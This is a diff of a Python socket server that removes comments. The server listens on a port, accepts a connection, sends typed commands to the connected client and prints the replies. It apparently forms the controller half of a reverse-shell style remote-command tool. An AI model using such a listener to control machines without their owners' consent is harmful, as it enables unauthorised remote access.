@@ -26,31 +26,26 @@ def log_message(message, level="INFO"):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = f"[{timestamp}] [{level}] {message}\n"
     
-    # Print to console
     print(log_entry.strip())
     
-    # Write to log file
     try:
         with open("server.log", "a") as log_file:
             log_file.write(log_entry)
     except Exception as e:
         print(f"Warning: Could not write to log file: {e}")
 
-
-# Create socket (connect two computers)
+# Create socket
 def create_socket():
     try:
         global host
         global port
         global s
         
-        # Try to load configuration from file
         config = load_config()
         if config and "server" in config:
             host = config["server"].get("host", "")
             port = config["server"].get("port", 9999)
         else:
-            # Use default values if config not available
             host = ""
             port = 9999
             
@@ -62,7 +57,7 @@ def create_socket():
         log_message(f"Socket creation error: {str(msg)}", "ERROR")
         return False
 
-# Binding socket to port
+# Bind socket to port
 def bind_socket():
     try:
         global host
@@ -92,7 +87,6 @@ def socket_accept():
         conn, address = s.accept()
         log_message(f"Connection established! IP: {address[0]} | Port: {address[1]}")
         
-        # Send commands to connected client
         send_command(conn, address)
         
     except KeyboardInterrupt:
@@ -100,7 +94,7 @@ def socket_accept():
         cleanup()
     except socket.error as e:
         log_message(f"Socket accept error: {str(e)}", "ERROR")
-        socket_accept()  # Try accepting again
+        socket_accept()
     except Exception as e:
         log_message(f"Unexpected error: {str(e)}", "ERROR")
     finally:
@@ -127,7 +121,6 @@ def send_command(conn, address):
                     conn.send(str.encode(cmd))
                     log_message(f"Command sent to {address[0]}: {cmd}")
                     
-                    # Receive response from client
                     client_response = str(conn.recv(1024), "utf-8")
                     print(client_response, end="")
                     
